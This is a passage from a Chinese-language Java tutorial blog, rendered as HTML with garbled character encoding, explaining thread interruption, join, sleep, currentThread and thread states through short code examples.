&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œå®Œæ¯•!&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        isQuit = <span class="literal">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;è®¾ç½® isQuit ä¸º true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816205907546.png" alt="image-20240816205907546"></p><p><strong>ä¸ºä»€ä¹ˆå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Ÿ</strong><br>å°å°lambda å¤§å¤§çš„åŠ›é‡ğŸ˜€<br>isQuitæ­¤æ—¶æ˜¯æˆå‘˜å˜é‡ï¼Œè€Œlambdaæœ‰ä¸€ä¸ªè¯­æ³•è§„åˆ™â€å˜é‡æ•è·â€œ.</p><h6 id="å˜é‡æ•è·"><a href="#å˜é‡æ•è·" class="headerlink" title="å˜é‡æ•è·"></a>å˜é‡æ•è·</h6><p>lambdaè¡¨è¾¾å¼ä¼šæŠŠå½“å‰ä½œç”¨åŸŸä¸­çš„å˜é‡åœ¨lambdaä¸­cvä¸€ä»½ï¼ˆå¤–é¢çš„å˜é‡æ˜¯å¦é”€æ¯ä¹Ÿå°±æ— å…³ç´§è¦äº†ï¼‰<br><strong>æ³¨æ„ï¼š</strong><u>å˜é‡æ•è·çš„å‰ææ˜¯å¿…é¡»åªèƒ½æ•è·ä¸€ä¸ªfinalæˆ–è€…â€å®é™…ä¸Šæ˜¯finalâ€œçš„å˜é‡.</u>ï¼ˆå³åˆå§‹åŒ–èµ‹å€¼åæœªæ”¹å˜å€¼å†…å®¹çš„â€œå˜é‡â€ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816205923769.png" alt="image-20240816205923769"><br>æ‰€ä»¥isQuitä¸ºæˆå‘˜å˜é‡æ—¶lambdaæ•è·ä¸åˆ°ï¼Œå°±å˜æˆäº†<strong>â€œå†…éƒ¨ç±»è®¿é—®å¤–éƒ¨ç±»çš„å±æ€§â€</strong>.å°±æ²¡æœ‰finalçš„é™åˆ¶äº†.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹çš„æ‰“æ–­</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">isQuit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!isQuit) &#123;</span><br><span class="line">                <span class="comment">// æ­¤å¤„çš„æ‰“å°å¯ä»¥æ›¿æ¢æˆä»»æ„çš„é€»è¾‘æ¥è¡¨ç¤ºçº¿ç¨‹çš„å®é™…å·¥ä½œå†…å®¹</span></span><br><span class="line">                System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œä¸­&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œå®Œæ¯•!&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        isQuit = <span class="literal">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;è®¾ç½® isQuit ä¸º true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><p>1.éœ€è¦æ‰‹åŠ¨åˆ›å»ºå˜é‡.<br>2.å½“çº¿ç¨‹å†…éƒ¨sleepæ—¶ï¼Œä¸»çº¿ç¨‹ä¿®æ”¹å˜é‡ï¼Œæ–°çº¿ç¨‹ä¸èƒ½åŠæ—¶å“åº”.</p><h5 id="è°ƒç”¨interruptï¼ˆï¼‰"><a href="#è°ƒç”¨interruptï¼ˆï¼‰" class="headerlink" title="è°ƒç”¨interruptï¼ˆï¼‰"></a>è°ƒç”¨interruptï¼ˆï¼‰</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹ç»ˆæ­¢</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// Thread ç±»å†…éƒ¨, æœ‰ä¸€ä¸ªç°æˆçš„æ ‡å¿—ä½, å¯ä»¥ç”¨æ¥åˆ¤å®šå½“å‰çš„å¾ªç¯æ˜¯å¦è¦ç»“æŸ.</span></span><br><span class="line">            <span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œä¸­&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;è®© t çº¿ç¨‹ç»ˆæ­¢. &quot;</span>);</span><br><span class="line">        thread.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>currentThreadï¼ˆï¼‰è·å–å½“å‰çº¿ç¨‹çš„å®ä¾‹ï¼ˆThread threadï¼‰<br>Threadå†…éƒ¨æœ‰ä¸€ä¸ªæ ‡å¿—ä½ç”¨æ¥åˆ¤æ–­çº¿ç¨‹æ˜¯å¦ç»“æŸ<br>thread.interruptedï¼ˆï¼‰å°†Threadå¯¹è±¡å†…éƒ¨çš„æ ‡å¿—ä½ç½®ä¸ºtrueï¼ˆå³ä½¿çº¿ç¨‹å†…éƒ¨å‡ºç°é€»è¾‘é˜»å¡ã€sleepã€‘ä¹Ÿå¯ä»¥ä½¿ç”¨interruptedå”¤é†’ã€ä½¿sleepå†…éƒ¨è§¦å‘ä¸€ä¸ªå¼‚å¸¸ è¢«æå‰å”¤é†’ã€‘ï¼‰<br>è¿è¡Œå‘ç°</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816183840344.png" alt="image-20240816183840344"></p><p>sleepç¡®å®è¢«å”¤é†’äº†ä½†æ˜¯çº¿ç¨‹ä»åœ¨å·¥ä½œï¼Œå¹¶æœªçœŸæ­£ç»“æŸ.<br><strong>æ³¨æ„ï¼šinterruptedå”¤é†’çº¿ç¨‹ä¹‹å ï¼Œsleepæ–¹æ³•æŠ›å‡ºå¼‚å¸¸ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨æ¸…æ¥šåˆšæ‰è®¾ç½®çš„æ ‡å¿—ä½</strong><br>æœ‰ä¸‰æ–¹å¼å¯ä»¥è®©æˆ‘ä»¬æœ‰æ›´å¤šçš„â€œæ“ä½œç©ºé—´â€.<br>ä¸Šä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹ç»ˆæ­¢</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// Thread ç±»å†…éƒ¨, æœ‰ä¸€ä¸ªç°æˆçš„æ ‡å¿—ä½, å¯ä»¥ç”¨æ¥åˆ¤å®šå½“å‰çš„å¾ªç¯æ˜¯å¦è¦ç»“æŸ.</span></span><br><span class="line">            <span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œä¸­&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="comment">// 1. å‡è£…æ²¡å¬è§, å¾ªç¯ç»§ç»­æ­£å¸¸æ‰§è¡Œ.</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="comment">// 2. åŠ ä¸Šä¸€ä¸ª break, è¡¨ç¤ºè®©çº¿ç¨‹ç«‹å³ç»“æŸ.</span></span><br><span class="line">                    <span class="comment">// break;</span></span><br><span class="line">                    <span class="comment">// 3. åšä¸€äº›å…¶ä»–å·¥ä½œ, å®Œæˆä¹‹åå†ç»“æŸ.</span></span><br><span class="line">                    <span class="comment">// å…¶ä»–å·¥ä½œçš„ä»£ç æ”¾åˆ°è¿™é‡Œ.</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;è®© t çº¿ç¨‹ç»ˆæ­¢. &quot;</span>);</span><br><span class="line">        thread.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é™„ï¼š</strong></p><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">public void interrupt()</td><td align="center">ä¸­æ–­å¯¹è±¡å…³è”çš„çº¿ç¨‹ï¼Œå¦‚æœçº¿ç¨‹æ­£åœ¨é˜»å¡ï¼Œåˆ™ä»¥å¼‚å¸¸æ–¹å¼é€šçŸ¥ï¼Œ å¦åˆ™è®¾ç½®æ ‡å¿—ä½</td></tr><tr><td align="center">public static boolean interrupted()</td><td align="center">åˆ¤æ–­å½“å‰çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½æ˜¯å¦è®¾ç½®ï¼Œè°ƒç”¨åæ¸…é™¤æ ‡å¿—ä½</td></tr><tr><td align="center">public boolean isInterrupted(ï¼‰</td><td align="center">åˆ¤æ–­å¯¹è±¡å…³è”çš„çº¿ç¨‹çš„æ ‡å¿—ä½æ˜¯å¦è®¾ç½®ï¼Œè°ƒç”¨åä¸æ¸…é™¤æ ‡å¿—ä½</td></tr></tbody></table><h4 id="ç­‰å¾…è¿›ç¨‹join"><a href="#ç­‰å¾…è¿›ç¨‹join" class="headerlink" title="ç­‰å¾…è¿›ç¨‹join"></a>ç­‰å¾…è¿›ç¨‹join</h4><p>æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªçº¿ç¨‹åœ¨å®Œæˆå®ƒçš„å·¥ä½œåæ‰èƒ½è¿›è¡Œè‡ªå·±çš„ä¸‹ä¸€æ­¥å·¥ä½œï¼Œä½†åœ¨æœŸé—´æƒ³ç©¿æ’åˆ«çš„å·¥ä½œè¿›æ¥å°±éœ€è¦æ§åˆ¶çº¿ç¨‹ç»“æŸçš„é¡ºåºæ¥å®ç°.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œä¸­!&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®©ä¸»çº¿ç¨‹æ¥ç­‰å¾… t çº¿ç¨‹æ‰§è¡Œç»“æŸ.</span></span><br><span class="line">        <span class="comment">// ä¸€æ—¦è°ƒç”¨ join, ä¸»çº¿ç¨‹å°±ä¼šè§¦å‘é˜»å¡. æ­¤æ—¶ t çº¿ç¨‹å°±å¯ä»¥è¶æœºå®Œæˆåç»­çš„å·¥ä½œ.</span></span><br><span class="line">        <span class="comment">// ä¸€ç›´é˜»å¡åˆ° t æ‰§è¡Œå®Œæ¯•äº†, join æ‰ä¼šè§£é™¤é˜»å¡, æ‰èƒ½ç»§ç»­æ‰§è¡Œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;join ç­‰å¾…å¼€å§‹&quot;</span>);</span><br><span class="line">        thread.join();</span><br><span class="line">        System.out.println(<span class="string">&quot;join ç­‰å¾…ç»“æŸ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="thread-joinå·¥ä½œè¿‡ç¨‹"><a href="#thread-joinå·¥ä½œè¿‡ç¨‹" class="headerlink" title="thread.joinå·¥ä½œè¿‡ç¨‹"></a><strong>thread.joinå·¥ä½œè¿‡ç¨‹</strong></h5><p>1.å¦‚æœçº¿ç¨‹æ­£åœ¨å·¥ä½œä¸­ï¼Œæ­¤æ—¶è°ƒç”¨threadçº¿ç¨‹å°±ä¼šé˜»å¡ï¼Œä¸€ç›´é˜»å¡åˆ°threadçº¿ç¨‹æ‰§è¡Œç»“æŸä½ç½®.<br>2.å¦‚æœthreadçº¿ç¨‹å·²ç»æ‰§è¡Œç»“æŸäº†ï¼Œæ­¤æ—¶è°ƒç”¨joinçº¿ç¨‹ï¼Œå°±ä¼šç›´æ¥è¿”å›ï¼Œä¸ä¼šæ¶‰åŠé˜»å¡.<br>ã€å®é™…å¼€å‘ä¸­æ¯”è¾ƒå»ºè®®ä½¿ç”¨joinæ—¶å¸¦æœ‰è¶…æ—¶æ—¶é—´ã€‘</p><p><strong>Tipsï¼š</strong><br>sleepæœ¬èº«ä¹Ÿæœ‰ç²¾åº¦è¯¯å·®ï¼Œè°ƒåº¦çº¿ç¨‹ä¹Ÿæœ‰å¼€é”€.ï¼ˆå³å”¤é†’çº¿ç¨‹ä¹‹åã€å°±ç»ªçŠ¶æ€ã€‘ä¸æ˜¯ç«‹å³å›åˆ°CPUä¸Šè¿è¡Œï¼‰</p><p><strong>é™„ï¼š</strong></p><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">public void join(ï¼‰</td><td align="center">ç­‰å¾…çº¿ç¨‹ç»“æŸ</td></tr><tr><td align="center">public void join(long millisï¼‰</td><td align="center">ç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œæœ€å¤šç­‰millisæ¯«ç§’</td></tr><tr><td align="center">public void join(long millisï¼Œint nanosï¼‰</td><td align="center">ç²¾åº¦æ›´é«˜ä½†åŒç†</td></tr></tbody></table><h4 id="è·å–çº¿ç¨‹å¼•ç”¨"><a href="#è·å–çº¿ç¨‹å¼•ç”¨" class="headerlink" title="è·å–çº¿ç¨‹å¼•ç”¨"></a>è·å–çº¿ç¨‹å¼•ç”¨</h4><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public static Thread currentThread()ï¼›</td><td>è¿”å›å½“å‰çº¿ç¨‹å¯¹è±¡çš„å¼•ç”¨</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        System.out.println(thread.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¼‘çœ è¿›ç¨‹"><a href="#ä¼‘çœ è¿›ç¨‹" class="headerlink" title="ä¼‘çœ è¿›ç¨‹"></a>ä¼‘çœ è¿›ç¨‹</h4><p>çœ¼ç†Ÿå—è€å¸ˆä»¬hh<br><strong>æ³¨æ„ï¼šå› ä¸ºçº¿ç¨‹æ˜¯ä¸å¯æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•åªèƒ½ä¿è¯å®é™…ä¼‘çœ æ—¶é—´å¤§äºç­‰äºå‚æ•°è®¾ç½®çš„ä¼‘çœ æ—¶é—´</strong></p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public static void sleep(long millis) throws InterruptedException</td><td>ä¼‘çœ å½“å‰çº¿ç¨‹ millisæ¯«ç§’</td></tr><tr><td>public static void sleep(long millis, int nanos) throws InterruptedException</td><td>æ›´é«˜ç²¾åº¦çš„ä¼‘çœ </td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çº¿ç¨‹çŠ¶æ€"><a href="#çº¿ç¨‹çŠ¶æ€" class="headerlink" title="çº¿ç¨‹çŠ¶æ€"></a>çº¿ç¨‹çŠ¶æ€</h3><p>å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåˆ¤æ–­å½“å‰ç¨‹åºæ‰§è¡Œçš„çŠ¶å†µ.<br>çº¿ç¨‹çš„çŠ¶æ€æ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹Thread.State.</p><h4 id="NEW"><a href="#NEW" class="headerlink" title="NEW"></a>NEW</h4><p>å®‰æ’äº†å·¥ä½œä½†è¿˜åœ¨æ‘¸é±¼æœªåŠ¨<br>Threadå¯¹è±¡å·²ç»æœ‰äº†ä½†startæ–¹æ³•è¿˜æ²¡è°ƒç”¨.</p><h4 id="TERMINATED"><a href="#TERMINATED" class="headerlink" title="TERMINATED"></a>TERMINATED</h4><p>å·¥ä½œå·²å®Œæˆ<br>Threadå¯¹è±¡è¿˜åœ¨ï¼Œå†…æ ¸ä¸­çº¿ç¨‹å·²ç»ç»“æŸäº†.</p><h4 id="RUNNABLE"><a href="#RUNNABLE" class="headerlink" title="RUNNABLE"></a>RUNNABLE</h4><p>å¯å·¥ä½œï¼Œå¯ä»¥åˆ†æˆæ­£åœ¨å·¥ä½œä¸­å’Œå³å°†å¼€å§‹çš„å·¥ä½œ<br>å°±ç»ªçŠ¶æ€ï¼ˆçº¿ç¨‹å·²ç»åœ¨CPUä¸Šæ‰§è¡Œäº†&#x2F;çº¿ç¨‹æ­£åœ¨ç­‰å¾…CPUæ‰§è¡Œï¼‰</p><h4 id="TIMED-WAITING"><a href="#TIMED-WAITING" class="headerlink" title="TIMED_WAITING"></a>TIMED_WAITING</h4><p>æ’é˜Ÿç­‰å®‰æ’å·¥ä½œ<br>é˜»å¡.sleepè¿™ç§å›ºå®šæ—¶é—´çš„æ–¹æ³•äº§ç”Ÿçš„é˜»å¡.</p><h4 id="WAITING"><a href="#WAITING" class="headerlink" title="WAITING"></a>WAITING</h4><p>æ’é˜Ÿç­‰å®‰æ’å·¥ä½œ<br>ç”±äºwaitè¿™ç§ä¸å›ºå®šæ—¶é—´çš„æ–¹å¼äº§ç”Ÿçš„é˜»å¡.</p><h4 id="BLOCKED"><a href="#BLOCKED" class="headerlink" title="BLOCKED"></a>BLOCKED</h4><p>æ’é˜Ÿç­‰å®‰æ’å·¥ä½œ<br>é˜»å¡.é”ç«äº‰äº§ç”Ÿ.<br><strong>ä¸é˜»å¡ç›¸å…³çš„ä¸‰ç§çŠ¶æ€åç»­å¸¸ç”¨äºåˆ†æâ€œçº¿ç¨‹å¡æ­»â€é—®é¢˜</strong></p><h5 id="ä»£ç å¥—é¤"><a href="#ä»£ç å¥—é¤" class="headerlink" title="ä»£ç å¥—é¤"></a>ä»£ç å¥—é¤</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;Thread&quot;</span>);</span><br><span class="line">        <span class="comment">//çº¿ç¨‹æœªè°ƒç”¨startæ–¹æ³•å¯¹è±¡å·²åˆ›å»º æ­¤æ—¶çŠ¶æ€ä¸ºNew</span></span><br><span class="line">        System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="keyword">while</span> (t.isAlive()) &#123;</span><br><span class="line">            <span class="comment">//RUNNABLE çº¿ç¨‹æ­£åœ¨æ‰§è¡Œ</span></span><br><span class="line">            System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//çº¿ç¨‹æ‰§è¡Œç»“æŸTERMINATED</span></span><br><span class="line">        System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) 